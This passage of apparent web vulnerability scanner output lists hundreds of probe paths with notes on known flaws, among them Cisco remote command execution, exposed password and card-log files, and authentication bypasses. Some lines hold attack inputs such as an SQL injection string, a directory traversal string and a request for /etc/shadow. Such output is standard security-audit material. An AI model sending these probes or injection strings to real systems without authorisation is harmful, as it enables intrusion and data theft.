++ GET /level/34/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/38/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/39/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/40/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/42/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/43/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/46/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/48/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/50/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/52/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/54/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/58/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/61/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/62/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/63/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/66/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/69/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/70/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/71/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/72/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/75/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/76/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/77/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/79/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/86/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/88/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/89/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/90/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/96/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /level/99/exec//show: CISCO HTTP service allows remote execution of commands. See: CVE-2001-0537: 
++ GET /users.lst: LocalWEB2000 users.lst passwords found. See: CVE-2002-1353: 
++ GET /WS_FTP.LOG: WS_FTP.LOG file was found. It may contain sensitive information. See: OSVDB-13405: 
++ GET /lcgi/lcgitest.nlm: Novell web server shows the server environment. See: CVE-2004-2104: 
++ GET /com/: Novell web server allows directory listing. See: CVE-2004-2106: 
++ GET /com/novell/: Novell web server allows directory listing. See: CVE-2004-2106: 
++ GET //admin/admin.shtml: Axis network camera may allow admin bypass by using double-slashes before URLs. See: CVE-2003-0240: 
++ GET /axis-cgi/buffer/command.cgi: Axis WebCam 2400 may allow overwriting or creating files on the system. See: https://www.securityfocus.com/archive/1/313485: 
++ GET /support/messages: Axis WebCam allows retrieval of messages file (/var/log/messages). See: https://www.securityfocus.com/archive/1/313485: 
++ GET /upload.cgi+: The upload.cgi allows attackers to upload arbitrary files to the server. See: OSVDB-228: 
++ GET /server-status: This reveals Apache information. Comment out appropriate line in the Apache conf file or restrict access to allowed sources. See: OSVDB-561: 
++ GET /publisher/: Netscape Enterprise Server with Web Publishing can allow attackers to edit web pages and/or list arbitrary directories via Java applet. See: CVE-2000-0237: 
++ GET /counter/1/n/n/0/3/5/0/a/123.gif: The Roxen Counter may eat up excessive CPU time with image requests. See: OSVDB-155: 
++ GET /iissamples/exair/search/search.asp: Scripts within the Exair package on IIS 4 can be used for a DoS against the server. See: CVE-1999-0449: 
++ GET /cpanel/: Web-based control panel. See: OSVDB-2117: 
++ GET /shopping/diag_dbtest.asp: VP-ASP Shopping Cart 5.0 contains multiple SQL injection vulnerabilities. See: CVE-2003-0560: 
++ GET /wwwboard/passwd.txt: The wwwboard password file is browsable. Change wwwboard to store this file elsewhere, or upgrade to the latest version. See: CVE-1999-0930: 
++ GET /photo/: My Photo Gallery pre 3.6 contains multiple vulnerabilities including directory traversal, unspecified vulnerabilities and remote management interface access. See: OSVDB-2695: 
++ GET /photodata/: My Photo Gallery pre 3.6 contains multiple vulnerabilities including directory traversal, unspecified vulnerabilities and remote management interface access. See: OSVDB-2695: 
++ GET /msadc/msadcs.dll: . See: CVE-1999-1011 BID-529 MS98-004 MS99-025 http://attrition.org/security/advisory/individual/rfp/rfp.9902.rds_iis: 
++ GET /musicqueue.cgi: Musicqueue 1.20 is vulnerable to a buffer overflow. Ensure the latest version is installed (exploit not attempted). See: CVE-2003-1140,http://musicqueue.sourceforge.net/: 
++ GET /scripts/tools/newdsn.exe: This can be used to make DSNs, useful in use with an ODBC exploit and the RDS exploit (with msadcs.dll). Also may allow files to be created on the server. See: BID-1818 CVE-1999-0191 http://attrition.org/security/advisory/individual/rfp/rfp.9901.nt_odbc: 
++ GET /admin/database/wwForum.mdb: Web Wiz Forums pre 7.5 is vulnerable to Cross-Site Scripting attacks. Default login/pass is Administrator/letmein. See: OSVDB-2813: 
++ GET /iisadmpwd/aexp3.htr: Gives domain and system name, may allow an attacker to brute force for access. Also will allow an NT4 user to change his password regardless of the 'user cannot change password' security policy. CVE-1999-0407. BID-4236. BID-2110. See: CVE-1999-0407: 
++ GET /iisadmpwd/aexp4b.htr: Gives domain and system name, may allow an attacker to brute force for access. Also will allow an NT4 user to change his password regardless of the 'user cannot change password' security policy. CVE-1999-0407. BID-4236. BID-2110. See: CVE-1999-0407: 
++ GET //admin/aindex.htm: FlexWATCH firmware 2.2 is vulnerable to authentication bypass by prepending an extra /'s. See: CVE-2006-3604: 
++ GET /c32web.exe/ChangeAdminPassword: This CGI may contain a backdoor and may allow attackers to change the Cart32 admin password. See: CVE-2000-0429: 
++ GET /showmail.pl: @Mail WebMail 3.52 allows attacker to read arbitrary user's mailbox. Requires knowing valid user name and appending ?Folder=../../victim@somehost.com/mbox/Inbox to the showmail.pl file. See: OSVDB-2944: 
++ GET /reademail.pl: @Mail WebMail 3.52 contains an SQL injection that allows attacker to read any email message for any address registered in the system. Example to append to reademail.pl: ?id=666&folder=qwer'%20or%20EmailDatabase_v.Account='victim@atmail.com&print=1. See: OSVDB-2948: 
++ GET /iissamples/exair/search/query.asp: Scripts within the Exair package on IIS 4 can be used for a DoS against the server. See: CVE-1999-0449: 
++ GET /sqlnet.log: Oracle log file found.
++ GET /acceso/: This might be interesting.
++ GET /access.log: This might be interesting.
++ GET /access/: This might be interesting.
++ GET /access_log: This might be interesting.
++ GET /acciones/: This might be interesting.
++ GET /account/: This might be interesting.
++ GET /accounting/: This might be interesting.
++ GET /activex/: This might be interesting.
++ GET /adm/: This might be interesting.
++ GET /admin.htm: This might be interesting.
++ GET /admin.html: This might be interesting.
++ GET /admin.php: This might be interesting.
++ GET /admin.php3: This might be interesting.
++ GET /admin.shtml: This might be interesting.
++ GET /admin/: This might be interesting.
++ GET /Administration/: This might be interesting.
++ GET /administration/: This might be interesting.
++ GET /administrator/: This might be interesting.
++ GET /Admin_files/: This might be interesting.
++ GET /advwebadmin/: This might be interesting: probably HostingController, www.hostingcontroller.com.
++ GET /Agent/: This might be interesting.
++ GET /Agentes/: This might be interesting.
++ GET /agentes/: This might be interesting.
++ GET /Agents/: This might be interesting.
++ GET /analog/: This might be interesting.
++ GET /apache/: This might be interesting.
++ GET /app/: This might be interesting.
++ GET /applicattion/: This might be interesting.
++ GET /applicattions/: This might be interesting.
++ GET /apps/: This might be interesting.
++ GET /archivar/: This might be interesting.
++ GET /archive/: This might be interesting.
++ GET /archives/: This might be interesting.
++ GET /archivo/: This might be interesting.
++ GET /asp/: This might be interesting.
++ GET /Asp/: This might be interesting.
++ GET /atc/: This might be interesting.
++ GET /auth/: This might be interesting.
++ GET /awebvisit.stat: This might be interesting.
++ GET /ayuda/: This might be interesting.
++ GET /backdoor/: This might be interesting.
++ GET /backup/: This might be interesting.
++ GET /bak/: This might be interesting.
++ GET /banca/: This might be interesting.
++ GET /banco/: This might be interesting.
++ GET /bank/: This might be interesting.
++ GET /bbv/: This might be interesting.
++ GET /bdata/: This might be interesting.
++ GET /bdatos/: This might be interesting.
++ GET /beta/: This might be interesting.
++ GET /bin/: This might be interesting.
++ GET /boot/: This might be interesting.
++ GET /buy/: This might be interesting.
++ GET /buynow/: This might be interesting.
++ GET /c/: This might be interesting.
++ GET /cache-stats/: This might be interesting.
++ GET /caja/: This might be interesting.
++ GET /card/: This might be interesting.
++ GET /cards/: This might be interesting.
++ GET /cart/: This might be interesting.
++ GET /cash/: This might be interesting.
++ GET /ccard/: This might be interesting.
++ GET /ccbill/secure/ccbill.log: CC Bill log file. Seen in carding forums. See: https://packetstormsecurity.com/files/32406/xmas.txt.html: 
++ GET /cdrom/: This might be interesting.
++ GET /cert/: This might be interesting.
++ GET /certificado/: This might be interesting.
++ GET /certificate: This might be interesting.
++ GET /cfdocs/exampleapp/email/application.cfm: This might be interesting.
++ GET /cfdocs/exampleapp/publish/admin/addcontent.cfm: This might be interesting.
++ GET /cfdocs/exampleapp/publish/admin/application.cfm: This might be interesting.
++ GET /cfdocs/examples/httpclient/mainframeset.cfm: This might be interesting.
++ GET /client/: This might be interesting.
++ GET /cliente/: This might be interesting.
++ GET /clientes/: This might be interesting.
++ GET /clients/: This might be interesting.
++ GET /communicator/: This might be interesting.
++ GET /compra/: This might be interesting.
++ GET /compras/: This might be interesting.
++ GET /compressed/: This might be interesting.
++ GET /conecta/: This might be interesting.
++ GET /connect/: This might be interesting.
++ GET /correo/: This might be interesting.
++ GET /crypto/: This might be interesting.
++ GET /css/: This might be interesting.
++ GET /cuenta/: This might be interesting.
++ GET /cuentas/: This might be interesting.
++ GET /dan_o.dat: This might be interesting.
++ GET /dat/: This might be interesting.
++ GET /data/: This might be interesting.
++ GET /dato/: This might be interesting.
++ GET /datos/: This might be interesting.
++ GET /db/: This might be interesting.
++ GET /dbase/: This might be interesting.
++ GET /demo/: This might be interesting.
++ GET /demos/: This might be interesting.
++ GET /dev/: This might be interesting.
++ GET /devel/: This might be interesting.
++ GET /development/: This might be interesting.
++ GET /dir/: This might be interesting.
++ GET /directory/: This might be interesting.
++ GET /DMR/: This might be interesting.
++ GET /doc-html/: This might be interesting.
++ GET /down/: This might be interesting.
++ GET /download/: This might be interesting.
++ GET /downloads/: This might be interesting.
++ GET /easylog/easylog.html: Seen in carding forums. See: https://packetstormsecurity.com/files/32406/xmas.txt.html: 
++ GET /ejemplo/: This might be interesting.
++ GET /ejemplos/: This might be interesting.
++ GET /employees/: This might be interesting.
++ GET /envia/: This might be interesting.
++ GET /enviamail/: This might be interesting.
++ GET /excel/: This might be interesting.
++ GET /Excel/: This might be interesting.
++ GET /EXE/: This might be interesting.
++ GET /exe/: This might be interesting.
++ GET /fbsd/: This might be interesting.
++ GET /file/: This might be interesting.
++ GET /fileadmin/: This might be interesting.
++ GET /files/: This might be interesting.
++ GET /forum/: This might be interesting.
++ GET /forums/: This might be interesting.
++ GET /foto/: This might be interesting.
++ GET /fotos/: This might be interesting.
++ GET /fpadmin/: This might be interesting.
++ GET /ftp/: This might be interesting.
++ GET /gfx/: This might be interesting.
++ GET /global/: This might be interesting.
++ GET /graphics/: This might be interesting.
++ GET /guest/: This might be interesting.
++ GET /guestbook/: This might be interesting.
++ GET /guests/: This might be interesting.
++ GET /hidden/: This might be interesting.
++ GET /hitmatic/: This might be interesting.
++ GET /hitmatic/analyse.cgi: This might be interesting.
++ GET /hits.txt: This might be interesting.
++ GET /hit_tracker/: This might be interesting.
++ GET /home/: This might be interesting.
++ GET /homepage/: This might be interesting.
++ GET /htdocs/: This might be interesting.
++ GET /html/: This might be interesting.
++ GET /htpasswd: This might be interesting.
++ GET /hyperstat/stat_what.log: This might be interesting. See: https://packetstormsecurity.com/files/32406/xmas.txt.html: 
++ GET /ibill/: This might be interesting.
++ GET /idea/: This might be interesting.
++ GET /ideas/: This might be interesting.
++ GET /imagenes/: This might be interesting.
++ GET /img/: This might be interesting.
++ GET /imgs/: This might be interesting.
++ GET /import/: This might be interesting.
++ GET /impreso/: This might be interesting.
++ GET /includes/: This might be interesting.
++ GET /incoming/: This might be interesting.
++ GET /info/: This might be interesting.
++ GET /informacion/: This might be interesting.
++ GET /information/: This might be interesting.
++ GET /ingresa/: This might be interesting.
++ GET /ingreso/: This might be interesting.
++ GET /install/: This might be interesting.
++ GET /internal/: This might be interesting.
++ GET /intranet/: This might be interesting.
++ GET /invitado/: This might be interesting.
++ GET /invitados/: This might be interesting.
++ GET /java/: This might be interesting.
++ GET /jdbc/: This might be interesting.
++ GET /job/: This might be interesting.
++ GET /jrun/: This might be interesting.
++ GET /js: This might be interesting.
++ GET /lib/: This might be interesting.
++ GET /library/: This might be interesting.
++ GET /libro/: This might be interesting.
++ GET /linux/: This might be interesting.
++ GET /log.htm: This might be interesting.
++ GET /log.html: This might be interesting.
++ GET /log.txt: This might be interesting.
++ GET /logfile.htm: This might be interesting.
++ GET /logfile.html: This might be interesting.
++ GET /logfile.txt: This might be interesting.
++ GET /logfile/: This might be interesting.
++ GET /logfiles/: This might be interesting.
++ GET /logger.html: This might be interesting.
++ GET /logger/: This might be interesting.
++ GET /logging/: This might be interesting.
++ GET /login/: This might be interesting.
++ GET /logs/: This might be interesting.
++ GET /logs/error_log: This might be interesting.
++ GET /lost+found/: This might be interesting.
++ GET /mail/: This might be interesting.
++ GET /marketing/: This might be interesting.
++ GET /master.password: This might be interesting.
++ GET /members/: This might be interesting.
++ GET /message/: This might be interesting.
++ GET /messaging/: This might be interesting.
++ GET /ministats/admin.cgi: This might be interesting.
++ GET /misc/: This might be interesting.
++ GET /mkstats/: This might be interesting.
++ GET /movimientos/: This might be interesting.
++ GET /mp3/: This might be interesting.
++ GET /mqseries/: This might be interesting.
++ GET /msql/: This might be interesting.
++ GET /msword/: This might be interesting.
++ GET /Msword/: This might be interesting.
++ GET /MSword/: This might be interesting.
++ GET /NetDynamic/: This might be interesting.
++ GET /NetDynamics/: This might be interesting.
++ GET /netscape/: This might be interesting.
++ GET /new/: This might be interesting.
++ GET /noticias/: This might be interesting.
++ GET /odbc/: This might be interesting.
++ GET /officescan/cgi/jdkRqNotify.exe: This might be interesting.
++ GET /old/: This might be interesting.
++ GET /oradata/: This might be interesting.
++ GET /order/: This might be interesting.
++ GET /orders/: This might be interesting.
++ GET /orders/checks.txt: Seen in carding forums. See: https://packetstormsecurity.com/files/32406/xmas.txt.html: 
++ GET /orders/orders.log: Seen in carding forums. See: https://packetstormsecurity.com/files/32406/xmas.txt.html: 
++ GET /outgoing/: This might be interesting.
++ GET /ows/: This might be interesting: Oracle Web Services?.
++ GET /pages/: This might be interesting.
++ GET /Pages/: This might be interesting.
++ GET /passwd: This might be interesting.
++ GET /passwd.adjunct: This might be interesting.
++ GET /passwd.txt: This might be interesting.
++ GET /passwords.txt: This might be interesting.
++ GET /passwords/: This might be interesting.
++ GET /PDG_Cart/: This might be interesting.
++ GET /people.list: This might be interesting.
++ GET /perl5/: This might be interesting.
++ GET /php/: This might be interesting.
++ GET /pics/: This might be interesting.
++ GET /piranha/secure/passwd.php3: This might be interesting.
++ GET /pix/: This might be interesting.
++ GET /porn/: This might be interesting.
++ GET /pr0n/: This might be interesting.
++ GET /privado/: This might be interesting.
++ GET /private/: This might be interesting.
++ GET /prod/: This might be interesting.
++ GET /pron/: This might be interesting.
++ GET /prueba/: This might be interesting.
++ GET /pruebas/: This might be interesting.
++ GET /pub/: This might be interesting.
++ GET /public/: This might be interesting.
++ GET /publica/: This might be interesting.
++ GET /publicar/: This might be interesting.
++ GET /publico/: This might be interesting.
++ GET /purchase/: This might be interesting.
++ GET /purchases/: This might be interesting.
++ GET /python/: This might be interesting.
++ GET /README.TXT: This might be interesting.
++ GET /register/: This might be interesting.
++ GET /registered/: This might be interesting.
++ GET /reports/: This might be interesting.
++ GET /reseller/: This might be interesting.
++ GET /restricted/: This might be interesting.
++ GET /retail/: This might be interesting.
++ GET /reviews/newpro.cgi: This might be interesting.
++ GET /sales/: This might be interesting.
++ GET /sample/: This might be interesting.
++ GET /samples/: This might be interesting.
++ GET /save/: This might be interesting.
++ GET /scr/: This might be interesting.
++ GET /scripts/weblog: This might be interesting.
++ GET /search.vts: This might be interesting.
++ GET /secret/: This might be interesting.
++ GET /sell/: This might be interesting.
++ GET /service/: This might be interesting.
++ GET /servicio/: This might be interesting.
++ GET /servicios/: This might be interesting.
++ GET /setup/: This might be interesting.
++ GET /shop/: This might be interesting.
++ GET /shopper/: This might be interesting.
++ GET /solaris/: This might be interesting.
++ GET /Sources/: This might be interesting: may be YaBB.
++ GET /spwd: This might be interesting.
++ GET /staff/: This might be interesting.
++ GET /stat.htm: This might be interesting.
++ GET /stat/: This might be interesting.
++ GET /statistic/: This might be interesting.
++ GET /Statistics/: This might be interesting.
++ GET /statistics/: This might be interesting.
++ GET /stats.htm: This might be interesting.
++ GET /stats.html: This might be interesting.
++ GET /stats/: This might be interesting.
++ GET /Stats/: This might be interesting.
++ GET /status/: This might be interesting.
++ GET /store/: This might be interesting.
++ GET /StoreDB/: This might be interesting.
++ GET /stylesheet/: This might be interesting.
++ GET /stylesheets/: This might be interesting.
++ GET /subir/: This might be interesting.
++ GET /sun/: This might be interesting.
++ GET /support/: This might be interesting.
++ GET /swf: This might be interesting: Flash files?.
++ GET /sys/: This might be interesting.
++ GET /system/: This might be interesting.
++ GET /tar/: This might be interesting.
++ GET /tarjetas/: This might be interesting.
++ GET /temp/: This might be interesting.
++ GET /template/: This might be interesting: could have sensitive files or system information.
++ GET /temporal/: This might be interesting.
++ GET /test.htm: This might be interesting.
++ GET /test.html: This might be interesting.
++ GET /test.txt: This might be interesting.
++ GET /test/: This might be interesting.
++ GET /testing/: This might be interesting.
++ GET /tests/: This might be interesting.
++ GET /tmp/: This might be interesting.
++ GET /tools/: This might be interesting.
++ GET /tpv/: This might be interesting.
++ GET /trabajo/: This might be interesting.
++ GET /trafficlog/: This might be interesting.
++ GET /transito/: This might be interesting.
++ GET /tree/: This might be interesting.
++ GET /trees/: This might be interesting.
++ GET /updates/: This might be interesting.
++ GET /user/: This might be interesting.
++ GET /users/: This might be interesting.
++ GET /users/scripts/submit.cgi: This might be interesting.
++ GET /ustats/: This might be interesting.
++ GET /usuario/: This might be interesting.
++ GET /usuarios/: This might be interesting.
++ GET /vfs/: This might be interesting.
++ GET /warez/: This might be interesting.
++ GET /web/: This might be interesting.
++ GET /web800fo/: This might be interesting.
++ GET /webaccess.htm: This might be interesting.
++ GET /webadmin/: This might be interesting: probably HostingController, www.hostingcontroller.com.
++ GET /webboard/: This might be interesting.
++ GET /webcart-lite/: This might be interesting.
++ GET /webcart/: This might be interesting.
++ GET /webdata/: This might be interesting.
++ GET /weblog/: This might be interesting.
++ GET /weblogs/: This might be interesting.
++ GET /webmaster_logs/: This might be interesting.
++ GET /WebShop/: This might be interesting.
++ GET /WebShop/logs/cc.txt: Seen in carding forums. See: https://packetstormsecurity.com/files/32406/xmas.txt.html: 
++ GET /website/: This might be interesting.
++ GET /webstats/: This might be interesting.
++ GET /WebTrend/: This might be interesting.
++ GET /Web_store/: This might be interesting.
++ GET /windows/: This might be interesting.
++ GET /word/: This might be interesting.
++ GET /work/: This might be interesting.
++ GET /wstats/: This might be interesting.
++ GET /wusage/: This might be interesting.
++ GET /www-sql/: This might be interesting.
++ GET /www/: This might be interesting.
++ GET /wwwboard/wwwboard.cgi: This might be interesting.
++ GET /wwwjoin/: This might be interesting.
++ GET /wwwlog/: This might be interesting.
++ GET /wwwstats.html: This might be interesting.
++ GET /wwwstats/: This might be interesting.
++ GET /zipfiles/: This might be interesting.
++ GET /advworks/equipment/catalog_type.asp: Seen in carding forums. See: https://packetstormsecurity.com/files/32406/xmas.txt.html: 
++ GET /carbo.dll: This might be interesting.
++ GET /clocktower/: Microsoft Site Server sample files may have SQL injection. See: https://github.com/sullo/advisory-archives/blob/master/RFP2201.txt: 
++ GET /market/: Microsoft Site Server sample files may have SQL injection. See: https://github.com/sullo/advisory-archives/blob/master/RFP2201.txt: 
++ GET /mspress30/: Microsoft Site Server sample files may have SQL injection. See: https://github.com/sullo/advisory-archives/blob/master/RFP2201.txt: 
++ GET /sam: This might be interesting.
++ GET /sam._: This might be interesting.
++ GET /samples/search/queryhit.htm: This might be interesting.
++ GET /scripts/counter.exe: This might be interesting.
++ GET /scripts/cphost.dll: cphost.dll may have a DoS and a traversal issue. See: CVE-2002-1769: 
++ GET /scripts/fpadmcgi.exe: This might be interesting.
++ GET /scripts/postinfo.asp: This might be interesting.
++ GET /scripts/samples/ctguestb.idc: This might be interesting.
++ GET /scripts/samples/search/webhits.exe: This might be interesting.
++ GET /site/iissamples/: This might be interesting.
++ GET /vc30/: Microsoft Site Server sample files may have SQL injection. See: https://github.com/sullo/advisory-archives/blob/master/RFP2201.txt: 
++ GET /_mem_bin/: This might be interesting: user login.
++ GET /_mem_bin/FormsLogin.asp: This might be interesting: user login.
++ GET /perl/files.pl: This might be interesting.
++ GET /perl5/files.pl: This might be interesting.
++ GET /scripts/convert.bas: This might be interesting.
++ GET /custdata/: This may be COWS (CGI Online Worldweb Shopping), and may leak customer data.
++ GET /hostingcontroller/: This might be interesting: probably HostingController, www.hostingcontroller.com.
++ GET /data.sql: Database SQL?.
++ GET /databases/: Databases directy found.
++ GET /database.sql: Database SQL found.
++ GET /db.sql: Database SQL found.
++ GET /img-sys/: Default image directory should not allow directory listing.
++ GET /java-sys/: Default Java directory should not allow directory listing.
++ GET /javadoc/: Documentation...?.
++ GET /log/: Ahh...log information...fun!.
++ GET /manager/: May be a web server or site manager.
++ GET /manual/: Web server manual found.
++ GET /exchange/: This might be interesting: Outlook/Exchange OWA.
++ GET /finance.xls: Finance spreadsheet?.
++ GET /finances.xls: Finance spreadsheet?.
++ GET /abonnement.asp: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /acartpath/signin.asp?|-|0|404_Object_Not_Found: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /add_acl: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /admin/auth.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /admin/cfg/configtache.inc.php+: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /admin/cms/htmltags.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /admin/credit_card_info.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /admin/exec.php3: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /admin/index.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /admin/objects.inc.php4: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /admin/script.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /admin/templates/header.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /admin/upload.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /admin_t/include/aff_liste_langue.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /adv/gm001-mc/: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /aff_news.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /approval/ts_app.htm: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /archive.asp: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /archive_forum.asp: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /ashnews.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /auth.inc.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /b2-tools/gm-2-b2.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /bandwidth/index.cgi: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /basilix.php3: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /bigsam_guestbook.php?displayBegin=9999...9999: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /bin/common/user_update_passwd.pl: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /biztalktracking/RawCustomSearchField.asp?|-|0|404_Object_Not_Found: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /biztalktracking/rawdocdata.asp?|-|0|404_Object_Not_Found: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /board/index.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /bugtest+/+: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /caupo/admin/admin_workspace.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /ccbill/whereami.cgi: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /chat_dir/register.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /checkout_payment.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /communique.asp: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /community/forumdisplay.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /community/index.php?analized=anything: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /community/member.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /compte.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /config/html/cnf_gi.htm: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /convert-date.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /cp/rac/nsManager.cgi: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /csPassword.cgi?command=remove%20: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /cutenews/comments.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /cutenews/search.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /cutenews/shownews.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /database/metacart.mdb+: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /db.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /dcp/advertiser.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /defines.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /dltclnt.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /doc/admin/index.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /docs/NED: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /dotproject/modules/files/index_table.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /dotproject/modules/projects/addedit.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /dotproject/modules/projects/view.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /dotproject/modules/projects/vw_files.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /dotproject/modules/tasks/addedit.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /dotproject/modules/tasks/viewgantt.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /do_subscribe: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /email.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /emml_email_func.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /emumail.cgi?type=.%00: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /entete.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /enteteacceuil.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /etc/shadow+: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /eventcal2.php.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /ez2000/ezadmin.cgi: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /ez2000/ezboard.cgi: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /ez2000/ezman.cgi: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /faqman/index.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /filemanager/index.php3: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /filemgmt/brokenfile.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /filemgmt/singlefile.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /filemgmt/viewcat.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /filemgmt/visit.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum/mainfile.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum/member.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum/newreply.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum/newthread.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum/viewtopic.php: phpBB found.
++ GET /forum_arc.asp?n=268: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum_professionnel.asp?n=100: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /get_od_toc.pl?Profile=: WebTrends get_od_toc.pl may be vulnerable to a path disclosure error if this file is reloaded multiple times. See: CVE-2002-0596: 
++ GET /globals.php3: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /Gozila.cgi: Linksys BEF Series routers are vulnerable to multiple DoS attacks in Gozila.cgi. See: https://seclists.org/fulldisclosure/2004/Jun/49: 
++ GET /homebet/homebet.dll?form=menu&amp;option=menu-signin: This might be interesting: has been seen in web logs from an unknown scanner.
